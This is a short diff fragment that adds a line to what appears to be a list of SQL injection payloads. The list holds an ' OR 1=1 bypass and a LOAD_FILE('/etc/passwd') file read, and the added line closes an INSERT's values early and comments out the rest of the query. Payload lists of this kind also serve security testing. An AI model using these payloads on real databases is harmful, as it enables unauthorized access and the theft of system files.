@@ -4,3 +4,5 @@
 ' OR 1=1;
 
 SELECT LOAD_FILE('/etc/passwd')
+
+9999, CURRENT_TIMESTAMP, 'accepted'); --
